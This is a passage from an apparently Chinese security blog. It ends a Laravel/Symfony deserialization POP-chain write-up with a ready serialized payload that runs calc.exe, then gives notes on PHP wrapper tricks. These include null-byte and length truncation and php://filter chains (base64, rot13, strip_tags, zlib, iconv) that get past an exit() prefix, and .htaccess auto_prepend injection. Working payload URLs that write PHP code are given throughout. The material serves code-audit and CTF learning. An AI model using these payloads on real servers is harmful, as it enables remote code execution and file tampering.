class="string">&#x27;363&#x27;</span>,<span class="string">&#x27;333&#x27;</span>,<span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;a:1:&#123;i:0;s:7:&quot;useless&quot;;&#125;&#x27;</span>, <span class="string">&#x27;R:3;&#x27;</span>, <span class="title function_ invoke__">serialize</span>(<span class="variable">$POC</span>))));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>（有点丑，sorry)</p><p>然后输出的结果是：</p><h3 id="Payload"><a href="#Payload" class="headerlink" title="Payload:"></a>Payload:</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">O%3A68%3A%22Symfony%5CComponent%5CRouting%5CLoader%5CConfigurator%5CCollectionConfigurator%22%3A4%3A%7Bs%3A6%3A%22parent%22%3BO%3A41%3A%22Symfony%5CComponent%5CRouting%5CRouteCollection%22%3A1%3A%7Bs%3A6%3A%22routes%22%3Ba%3A1%3A%7Bs%3A8%3A%22dispatch%22%3Bs%3A6%3A%22system%22%3B%7D%7Ds%3A10%3A%22collection%22%3BO%3A41%3A%22Symfony%5CComponent%5CRouting%5CRouteCollection%22%3A1%3A%7Bs%3A6%3A%22routes%22%3Ba%3A1%3A%7Bs%3A8%3A%22dispatch%22%3Bs%3A6%3A%22system%22%3B%7D%7Ds%3A5%3A%22route%22%3BC%3A31%3A%22Symfony%5CComponent%5CRouting%5CRoute%22%3A163%3A%7Ba%3A9%3A%7Bs%3A4%3A%22path%22%3Bs%3A4%3A%22%2F%2F%2F%2F%22%3Bs%3A4%3A%22host%22%3BN%3Bs%3A8%3A%22defaults%22%3BN%3Bs%3A12%3A%22requirements%22%3BN%3Bs%3A7%3A%22options%22%3BN%3Bs%3A7%3A%22schemes%22%3BN%3Bs%3A7%3A%22methods%22%3BN%3Bs%3A9%3A%22condition%22%3BN%3Bs%3A8%3A%22compiled%22%3BN%3B%7D%7Ds%3A18%3A%22parentConfigurator%22%3BO%3A40%3A%22Illuminate%5CBroadcasting%5CPendingBroadcast%22%3A2%3A%7Bs%3A9%3A%22%00%2A%00events%22%3BO%3A15%3A%22Faker%5CGenerator%22%3A2%3A%7Bs%3A13%3A%22%00%2A%00formatters%22%3BR%3A3%3Bs%3A12%3A%22%00%2A%00providers%22%3BN%3B%7Ds%3A8%3A%22%00%2A%00event%22%3Bs%3A8%3A%22calc.exe%22%3B%7D%7D</span><br></pre></td></tr></table></figure><p>演示：</p><p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20221125021303083.png" alt="image-20221125021303083"></p><p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20221125022008959.png" alt="image-20221125022008959"></p><p>到这里就算是告一段落了。</p><h2 id="利用链梳理："><a href="#利用链梳理：" class="headerlink" title="利用链梳理："></a>利用链梳理：</h2><p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/%E6%97%A0%E6%A0%87%E9%A2%98.png" alt="无标题"></p><h2 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h2><p>这条链子主要是因为inHann师傅在他的研究里给出的是一个依赖里的链子，所以我想看看在Laravel里面有没有可以不通过依赖直接利用的那个<code>__wakeup()</code>的地方，然后捣腾出来的。之前看了一些博客，说这里被<code>__wakeup()</code>的置空给堵死了，但其实还是有办法利用的。</p><p>（其实感觉有点属于屠龙之技，没什么用，主要还是给师傅们提供一个思路吧hhh，希望师傅们轻喷。）</p><p>这一次审计主要学到的还是这个对冲的操作在POP链中的利用方式，这个做法还是很灵活的。</p>]]></content>
      
      
      <categories>
          
          <category> 代码审计 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 代码审计 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PHP伪协议进阶</title>
      <link href="/2022/11/09/PHP%E4%BC%AA%E5%8D%8F%E8%AE%AE%E8%BF%9B%E9%98%B6/"/>
      <url>/2022/11/09/PHP%E4%BC%AA%E5%8D%8F%E8%AE%AE%E8%BF%9B%E9%98%B6/</url>
      
        <content type="html"><![CDATA[<h1 id="php伪协议进阶总结："><a href="#php伪协议进阶总结：" class="headerlink" title="php伪协议进阶总结："></a>php伪协议进阶总结：</h1><p>这里主要还是对php伪协议的使用和绕过做一个总结。免得后面忘记了。</p><h2 id="绕过方式："><a href="#绕过方式：" class="headerlink" title="绕过方式："></a>绕过方式：</h2><h3 id="Url-00截断："><a href="#Url-00截断：" class="headerlink" title="Url%00截断："></a>Url%00截断：</h3><p>对于这种类型的代码：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$filename</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$filename</span>))&#123;</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$filename</span>.<span class="string">&quot;No&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>可以使用url%00截断进行绕过。这里是因为在使用Include函数的时候，对于参数进行了拼接，如果我们直接传入会造成不能正确执行伪协议的文件读取。</p><p>这里可以通过%00来对传入的伪协议进行截断，形如：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">php://filter/read=convert.base64-encode/resource=flag.php%00</span><br></pre></td></tr></table></figure><p>可以达成绕过。</p><h4 id="00截断的根本原理和使用条件："><a href="#00截断的根本原理和使用条件：" class="headerlink" title="%00截断的根本原理和使用条件："></a>%00截断的根本原理和使用条件：</h4><p>原理是因为%00在url中会被后端理解为是十六进制格式的值，然后服务器会将其作为16进制的hex自动翻译成0x00，也就是空值。</p><p>在底层的C和汇编中，会将这个空值用来表示字符串结束，是一个特殊的标识符。当解析到这个标识符的时候，就会自动停止读取，实现截断。</p><p><strong>使用条件：</strong></p><ul><li>GET方式传参</li><li>PHP版本小于5.3.4</li><li>启用magic_quote_gpc</li></ul><p><strong>注意不能使用POST，因为POST不会对%00进行url解码，因此不会生成空字符，需要使用0x00进行截断</strong></p><p>同时也不能将%00放在文件名里面，这是因为文件名中的%00会被解析为字符串，不能被正确执行。</p><blockquote><p>这里填</p></blockquote><h2 id="长度截断："><a href="#长度截断：" class="headerlink" title="长度截断："></a>长度截断：</h2><p>这里主要是利用操作系统对于目录字符存在有长度限制。</p><p>在windows环境下，对于目录的最大长度限制是256字节，而在Linux环境下，最大长度限制是4096字节。</p><p>只要超出了长度限制，就会产生丢弃。</p><p>因此，对于上述的文件名拼接，可以通过将文件名设置过长，来避免文件路径的拼接，同时使用的目录字符不会被错误读取，就可以绕过。</p><p>在windows环境下使用<code>.</code></p><p>在Linux环境下使用<code>./</code></p><h3 id="长度截断使用条件："><a href="#长度截断使用条件：" class="headerlink" title="长度截断使用条件："></a>长度截断使用条件：</h3><ul><li>php版本小于5.2.8</li></ul><h2 id="常见伪协议："><a href="#常见伪协议：" class="headerlink" title="常见伪协议："></a>常见伪协议：</h2><p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20221102001052116.png" alt="image-20221102001052116"></p><h2 id="exit-死亡绕过："><a href="#exit-死亡绕过：" class="headerlink" title="exit()死亡绕过："></a>exit()死亡绕过：</h2><p>在使用file_put_contents()函数进行文件写入的时候，经常会遇到通过<code>exit()</code>函数来避免命令执行的方法。一般管这玩意儿叫做死亡函数。</p><p>对于形如这样的代码：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>];</span><br><span class="line"><span class="variable">$b</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;b&#x27;</span>];</span><br><span class="line"><span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$b</span>,<span class="string">&quot;&lt;?php exit();?&gt;&quot;</span>.<span class="variable">$a</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>如果进行了文件写入之后，会发现<code>exit()</code>函数始终在需要执行的代码前面。因此需要进行绕过，否则的话不能实现我们需要的效果。</p><p>这里绕过的常见思路是对文件中的<code>exit()</code>函数进行污染。</p><p>常见操作有：</p><h3 id="base64解码绕过："><a href="#base64解码绕过：" class="headerlink" title="base64解码绕过："></a>base64解码绕过：</h3><p>对于base64来说，加密后的结果应该只包含<code>a-z,0-9,A-Z,+,=,/</code>这几个字符。</p><p>其中<code>=</code>用于填充字符串。</p><p>当PHP使用base64进行解码的时候，遇到不包含在base64字符集中的字符，会直接进行跳过，然后再进行解密。</p><p>同时会将四个字节作为一组来进行解码。</p><p>也就是说，对于文件中的<code>&lt;?php exit();?&gt;</code>函数，在base64中只会被认为是<code>phpexit</code>，这个时候只要再添加一个字节的字符，就会凑成八个字节，然后就会被base64解码成为乱码。保存到文件中。</p><p><strong>实例：</strong></p><p>测试代码：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>];</span><br><span class="line"><span class="variable">$b</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;b&#x27;</span>];</span><br><span class="line"><span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$b</span>,<span class="string">&quot;&lt;?php exit();?&gt;&quot;</span>.<span class="variable">$a</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20221102013448083.png" alt="image-20221102013448083"></p><p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20221102013437629.png" alt="image-20221102013437629"></p><p>这里使用php:&#x2F;&#x2F;filter的base64解密参数，对文件的内容进行解码，作为文件名，同时将<code>&lt;?php info(); ?&gt;</code>进行base64加密后，添加一个字节，传入。</p><p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20221102013703364.png" alt="image-20221102013703364"></p><p>添加一个a：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">aPD9waHAgcGhwaW5mbygpOyA/Pg==</span><br></pre></td></tr></table></figure><p>传入：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://localhost/?b=php://filter/write=convert.base64-decode/resource=test.php&amp;a=aPD9waHAgcGhwaW5mbygpOyA/Pg==</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20221102013743390.png" alt="image-20221102013743390"></p><p>可以看见exit()被污染了。可以正常执行php文件。</p><p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20221102013817384.png" alt="image-20221102013817384"></p><h3 id="rot13解码绕过："><a href="#rot13解码绕过：" class="headerlink" title="rot13解码绕过："></a>rot13解码绕过：</h3><p>原理和base64的解码绕过是相同的，之所以使用这个解码方式，是因为在php:&#x2F;&#x2F;filter中自带的加密解密方法就是base64和rot13。</p><p>关于rot13的加密解密原理，参考：</p><blockquote><p><a href="https://blog.51cto.com/u_15127612/4109762">https://blog.51cto.com/u_15127612/4109762</a></p></blockquote><p>简单来说，这个就是一个凯撒密码，将所有的字母向后位移13位就行。同时，也和base64一样，会将不在字符集内（a-z,A-Z）的符号进行忽略。</p><p>这里需要理解到的是，这个rot13因为是一个另类的凯撒算法，所以是一个<strong>对称密码</strong>，因此，只要进行两次加密，就等于解密，进行两次解密就等于加密。</p><p>所以，当我们传入的值是一个加密后的值，再进行一次加密之后，就会对等于解密，同时会将<code>&lt;?php exit(); ?&gt;</code>进行加密。就可以实现绕过了。</p><p>因此可以：</p><p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20221102104945463.png" alt="image-20221102104945463"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">localhost/?b=php://filter/string.rot13/resource=test.php&amp;a=&lt;?cuc cucvasb(); ?&gt;</span><br></pre></td></tr></table></figure><p>文件写入结果：</p><p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20221102105157811.png" alt="image-20221102105157811"></p><p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20221102110053855.png" alt="image-20221102110053855"></p><p>执行结果。</p><h4 id="版本问题："><a href="#版本问题：" class="headerlink" title="版本问题："></a>版本问题：</h4><p>对于小于php 5.3.29，可能会导致代码执行失败，应该是某个配置造成的。<img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20221102113506010.png" alt="image-20221102113506010"></p><h3 id="string-strip-tags嵌套绕过："><a href="#string-strip-tags嵌套绕过：" class="headerlink" title="string.strip_tags嵌套绕过："></a>string.strip_tags嵌套绕过：</h3><p>这个伪协议中的参数等同于使用strip_tags()函数处理所有的流。</p><p><code>strip_tags</code>—从字符串中去除 HTML 和 PHP 标记.该函数尝试返回给定的字符串<code>str</code>去除空字符、HTML 和 PHP 标记后的结果。它使用与函数<code>fgetss()</code>一样的机制去除标记。</p><p>因为这个可以去除php标记，所以可以嵌套使用，思路和之前的类似。</p><p>首先将我们想要写入的内容进行base64加密，然后再嵌套使用string.strip_tags和convert.base64-decode，先去除PHP标记，然后再进行base64解密，就可以实现写入了。</p><p>payload:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">localhost/?b=php://filter/string.strip_tags|convert.base64-decode/resource=test.php&amp;a=PD9waHAgcGhwaW5mbygpOyA/Pg==</span><br></pre></td></tr></table></figure><p>写入结果：</p><p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20221102115722605.png" alt="image-20221102115722605"></p><p>执行结果：</p><p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20221102234625046.png" alt="image-20221102234625046"></p><h4 id="使用条件："><a href="#使用条件：" class="headerlink" title="使用条件："></a>使用条件：</h4><p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20221103112712382.png" alt="image-20221103112712382"></p><ul><li>php版本小于7(虽然是写的小于7.3，但是实测是7.2的时候，就会报错了。)</li></ul><p>当在PHP版本大于7的环境使用的时候，会出现报错。</p><p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20221102235657480.png" alt="image-20221102235657480"></p><p>因此只能在PHP版本五中进行使用。而对于版本大于7的PHP环境中，也有自己的过滤器嵌套绕过方法。</p><h3 id="zlib-deflate嵌套绕过："><a href="#zlib-deflate嵌套绕过：" class="headerlink" title="zlib.deflate嵌套绕过："></a>zlib.deflate嵌套绕过：</h3><p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20221103113202119.png" alt="image-20221103113202119"></p><p>对于压缩过滤器，在平时使用php伪协议的时候不太常用到，这里贴一个链接，用来说明使用方式：</p><blockquote><p><a href="http://www.lvesu.com/blog/php/filters.compression.php">http://www.lvesu.com/blog/php/filters.compression.php</a></p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20221103114055890.png" alt="image-20221103114055890"></p><p>这里可以看见这个过滤器和<code>zip://</code>协议的不同，因为<code>zip://</code>协议是只能用于对本地文件的压缩和解压缩，但是<code>zlib.deflate</code>和<code>zlib.inflate</code>是用于对流的压缩和解压缩，可以用于将非压缩流，转化为压缩流。</p><p>如果只是单独使用压缩和解压缩，当然不会对文件的内容产生影响，但是可以在中间添加一个<code>string.tolower</code>，然后再进行解压缩流。</p><p><code>string.tolower</code>可以用于将输入流进行小写转换，这里的使用方式，主要是首先通过<code>zlib.deflate</code>将我们传入的参数进行压缩，然后进行小写转换，再进行解压缩。</p><p>这里的思路还是通过加密，解密，压缩解压缩的方式对文件中的值进行污染。</p><p>但是根本原理我在网上找了很多文章，都没找到。</p><p>也就是说，目前只能用在对于exit()函数的绕过中。</p><p>这里简述一下我尝试后得出的特点：</p><h4 id="特点："><a href="#特点：" class="headerlink" title="特点："></a>特点：</h4><ul><li>对于写入的语句来说，大写的字母不会被污染，对于小写的字母，当字母成为字符串的时候，会对其中的一些特殊字母污染。</li><li>特殊的字母有a,b,e之类的</li><li>会将空格消除掉。</li></ul><p>这里提供一下payload:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://localhost/?b=php://filter/zlib.deflate|string.tolower|zlib.inflate/resource=test.php&amp;a=&lt;?php%0dphpinfo();?&gt;</span><br></pre></td></tr></table></figure><p>写入效果：</p><p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20221103233049750.png" alt="image-20221103233049750"></p><p>这里需要注意到的一点是，因为通过这种方式写入的文件内容，会将其中的空格消除掉，所以在<code>&lt;?php</code>和<code>phpinfo();</code>中间，不能直接填写空格，而是要通过%0d进行分割，也就是url编码的换行符。</p><p>这里看别的师傅的博客，给了几个解，这里贴一下，用于参考：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?file=php://filter/zlib.deflate|string.tolower|zlib.inflate|/resource=4.php</span><br><span class="line">DATA:</span><br><span class="line">content=php://filter/zlib.deflate|string.tolower|zlib.inflate|?&gt;&lt;?php%0dphpinfo();?&gt;/resource=4.php</span><br><span class="line">或者</span><br><span class="line">content=php/:|&lt;?php%0Dphpinfo();?&gt;/resource=4.php</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>运行结果：</p><p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20221103233712610.png" alt="image-20221103233712610"></p><h3 id="htaccess文件预包含绕过："><a href="#htaccess文件预包含绕过：" class="headerlink" title=".htaccess文件预包含绕过："></a>.htaccess文件预包含绕过：</h3><p>对于<code>apache</code>中始终存在的.htaccess文件动点手脚。</p><p>首先，在php.ini中存在两个配置选项：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">auto_prepend_file 在页面顶部加载文件</span><br><span class="line">auto_append_file 在页面底部加载文件</span><br></pre></td></tr></table></figure><p>这两个配饰选项，可以通过在页面的底部或者是顶部对需要的文件进行加载，这个文件可以是多种文件。</p><p>配置方式例如：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">auto_prepend_file = &quot;/home/fdipzone/header.php&quot;</span><br><span class="line">auto_append_file = &quot;/home/fdipzone/footer.php&quot;</span><br></pre></td></tr></table></figure><p>使用以上的配置，会使得服务器内的所有页面都在顶部和尾部加载相应的php文件。</p><p>可以指定一个文件夹内的页面进行：</p><p>在需要进行文件包含的文件夹内加入.htaccess文件，写入如下配置</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">php_value auto_prepend_file &quot;/home/fdipzone/header.php&quot;</span><br><span class="line">php_value auto_append_file &quot;/home/fdipzone/footer.php&quot;</span><br></pre></td></tr></table></figure><p>只要能够对.htaccess文件进行修改，就能够使用任何文件对flag文件进行包含了。</p><p>因此可以写入如下payload:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://localhost/?b=php://filter/write=string.strip_tags/resource=.htaccess&amp;a=php_value%20auto_prepend_file%20%22/test.php%22</span><br></pre></td></tr></table></figure><p>然后就可以在对应的文件架下的任意页面加载flag了。</p><p>算是对<code>string.strip_tags</code>过滤器的进一步利用了，因为没有写入php语句，也不需要像上面的绕过方式一样，使用base64加密。</p><h2 id="exit-死亡绕过进阶：bypass相同变量"><a href="#exit-死亡绕过进阶：bypass相同变量" class="headerlink" title="exit()死亡绕过进阶：bypass相同变量"></a>exit()死亡绕过进阶：bypass相同变量</h2><p>对于上述的绕过方式，存在后端源码是这样的：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>];</span><br><span class="line"><span class="variable">$b</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;b&#x27;</span>]</span><br><span class="line"><span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$b</span>,<span class="string">&quot;&lt;?php exit();?&gt;&quot;</span>.<span class="variable">$a</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>但是实际上还存在这样的代码：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>];</span><br><span class="line"><span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$a</span>,<span class="string">&quot;&lt;?php exit();?&gt;&quot;</span>.<span class="variable">$a</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>这里可以看见，他将文件的名字设为了和我们写入的内容是一样的，这里就提高了难度，我们需要在写入内容中添加.php才能作为php文件进行执行。</p><p>已知的存在以下绕过方法：</p><h3 id="base64去除等号绕过："><a href="#base64去除等号绕过：" class="headerlink" title="base64去除等号绕过："></a>base64去除等号绕过：</h3><p>这里使用的base64和之前的方法不能一样，这里可以做一个实验：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://localhost/?a=php://filter/convert.base64-decode/resource=PD9waHAgcGhwaW5mbygpOz8+.php</span><br></pre></td></tr></table></figure><p>这里我传入payload如上。其中的字符串部分是加密后的<code>&lt;?php phpinfo(); ?&gt;</code>。理论上来说，这里会尝试写入文件。</p><p>但是事实上，可以看见这里爆了很多错：</p><p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20221104103835977.png" alt="image-20221104103835977"></p><p>可以看见这里被我圈出来的部分，这个地方报的错比较关键。</p><p>首先重新理解一下使用base64加密流传入的数据</p><p>当我们使用以上的payload进行传入的时候，文件中的内容应当是：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php exit(); ?&gt;php://filter/convert.base64-decode/resource=PD9waHAgcGhwaW5mbygpOz8+.php</span><br></pre></td></tr></table></figure><p>然后对整体进行一次base64解密，这样就会对前面的exit()造成污染。</p><p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20221104150411294.png" alt="image-20221104150411294"></p><p>这里可以看见，通过输入payload，已经在本地生成了一个文件了，说明文件名是成功执行了的，但是文件内容是空的。<img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20221104150510242.png" alt="image-20221104150510242"></p><p>这里的主要原因是因为，在文件内容中，进行base64解密的时候，会将<code>resource=</code>这部分也作为base64进行解密，而<code>=</code>在base64中是作为占位填充符写入的，始终出现在加密字符串的最后端。</p><p>因此，只要在最后的等号后出现了别的字符，在base64进行解密的时候，就会认为这个字符串是有问题的，报错。</p><p>因此，要尝试写入，就必须想办法避免这个等号。</p><p>这里参考的网上师傅的做法，就是将使用<code>string.strip_tags</code>过滤器，将其中的resource后面的等号去掉：</p><p>这里payload大概是:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://localhost/text.php?a=php://filter/string.strip_tags|convert.base64-decode|%3C/resource=%3EaaPD9waHAgcGhwaW5mbygpOz8+/../123.php</span><br></pre></td></tr></table></figure><p>写入效果：</p><p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20221107142219896.png" alt="image-20221107142219896"></p><p>这里写入的原理，是因为在伪协议写入的文件流中，使用了string.strip_tags过滤器，当我们直接将文件内容写入后，进行读取的时候，就会将文件中的php标签，或是XML的标签去掉。而在这个payload中，对resource和等号部分做了处理，写成了<code>&lt;resource=&gt;</code>，这里会被理解为是XML的标签，因此会将<code>resource=</code>直接去除，这样就不会因为等号造成影响。</p><p>这里写一个参考payload:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://localhost/text.php?a=php://filter/string.strip_tags|convert.base64-decode|%3C/resource=%3EaaPD9waHAgcGhwaW5mbygpOyAgICAgICAgID8%2B/../123.php</span><br></pre></td></tr></table></figure><p>通过这个方式，能够将文件写入到123.php文件中。</p><p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20221107150009764.png" alt="image-20221107150009764"></p><p>执行效果：</p><p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20221107150122729.png" alt="image-20221107150122729"></p><h4 id="注意点："><a href="#注意点：" class="headerlink" title="注意点："></a>注意点：</h4><p>因为这里是因为<code>=</code>导致的报错，所以会需要对<code>resource=</code>进行去除，但是在对写入的字符串进行解密的时候，有可能同样会出现进行base64编码后，字符串内容出现&#x3D;号的占位符号。在这个情况下，写入的文件内容是：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php exit(); ?&gt;php://filter/string.strip_tags|convert.base64-decode|&lt;/resource=&gt;aaPD9waHAgcGhwaW5mbygpOyAgICAgPz4=/../123.php</span><br></pre></td></tr></table></figure><p>当对这个进行base64解密的时候，同样还是会出错。所以需要做一些操作。</p><p>比如可以在字符串中添加空格，跳过&#x3D;占位符。</p><p>或者是通过对字符串进行处理，在&#x3D;号的左右边添加<code>&lt;&gt;</code>，然后使用<code>string.strip_tags</code>删除，这样就不会出现问题了。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">aaPD9waHAgcGhwaW5mbygpOyAgICAgPz4&lt;=&gt;</span><br></pre></td></tr></table></figure><p>以及传入的base64加密的字符串前要加上两个字符，因为这样才能保证解码不会出错</p><p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20221107160725828.png" alt="image-20221107160725828"></p><p>文件解码的时候才能正常解码，否则最终还是会解码成为乱码。</p><p><strong>这个用法在TP5.0.x的POP链里可以用到</strong></p><h3 id="rot13编码"><a href="#rot13编码" class="headerlink" title="rot13编码"></a>rot13编码</h3><p>因为rot13编码方式其实是一个替换字符的凯撒密码，因此是不需要考虑等号的，可以和之前的绕过方式一样，直接执行就可以了。</p><p>这里可以给出一个Payload:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://localhost/text.php?a=php://filter/string.rot13|%3C?cuc%20cucvasb();?%3E/resource=123/../123.php</span><br></pre></td></tr></table></figure><p>通过这个方式，写入的文件内容如下：</p><p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20221107222551708.png" alt="image-20221107222551708"></p><p>要执行这个文件，需要没有开启<code>short_open_tag</code>这个选项。</p><h3 id="iconv字符编码绕过："><a href="#iconv字符编码绕过：" class="headerlink" title="iconv字符编码绕过："></a>iconv字符编码绕过：</h3><p>除了上述的几种编码方式，还有一种可以使用iconv字符编码进行绕过的方式。</p><p>其实基本原理还是类似于base64和rot13的编码方式。其实就是通过不同的编码方法，对exit()执行先加密，然后解密的过程，在这个过程中使得exit()函数失效即可。</p><p>在PHP中，iconv函数库主要用于完成各种字符集之间的转换，在该函数库下面存在一个<code>convert.iconv.</code>的过滤器，这个过滤器需要php支持iconv，而iconv是默认编译的。使用<code>convert.iconv.*</code>过滤器等同于使用iconv()函数处理所有的流数据。</p><p>（也就是直接对我们使用filter进行传入的所有流数据进行处理。）</p><p>使用iconv的格式大体如下：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">iconv ( string $in_charset , string $out_charset , string $str ) : string</span><br></pre></td></tr></table></figure><p>也就是将字符串str从<code>in_charset</code>转换编码到<code>out_chareset</code>。这里可以利用不同的编码格式，来对写入的字符串进行污染。</p><p>这里一般使用到的是ucs编码。</p><p>对于UCS存在两种编码格式：</p><p><strong>UCS-2和UCS-4<br>UCS-2就是用两个字节编码<br>UCS-4就是用四个字节编码</strong></p><p>因此，就和使用rot13方式一样，可以直接传入加密后的字符串，然后再进行解密即可。</p><p>UCS-2编码方式，是对目标字符进行2位一反转，而UCS-4则是对目标字符串进行四位一反转。</p><p>这里要进行字符编码，可以直接使用PHP中自带的函数，也就是上面写的iconv函数。</p><p>这里是使用ucs-2的函数：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span> = <span class="string">&quot;&lt;?php phpinfo();  ?&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">iconv</span>(<span class="string">&quot;UCS-2LE&quot;</span>,<span class="string">&quot;UCS-2BE&quot;</span>,<span class="variable">$a</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>输出效果：</p><p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20221108112249807.png" alt="image-20221108112249807"></p><p>这里的2LE和2BE可以看作是小端和大端的例子。</p><p>对于进行编码的字符串，需要是2的倍数，如果不是2的倍数的话，不能正常进行翻转，多余不满足的字符串会被截断。</p><p>同理，UCS-4也是这样的，字符串需要满足是4的倍数，否则不能正常进行翻转，同样会将多余的部分截断。</p><p>UCS-4的程序：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span> = <span class="string">&quot;&lt;?php phpinfo();  ?&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">iconv</span>(<span class="string">&quot;UCS-4LE&quot;</span>,<span class="string">&quot;UCS-4BE&quot;</span>,<span class="variable">$a</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img 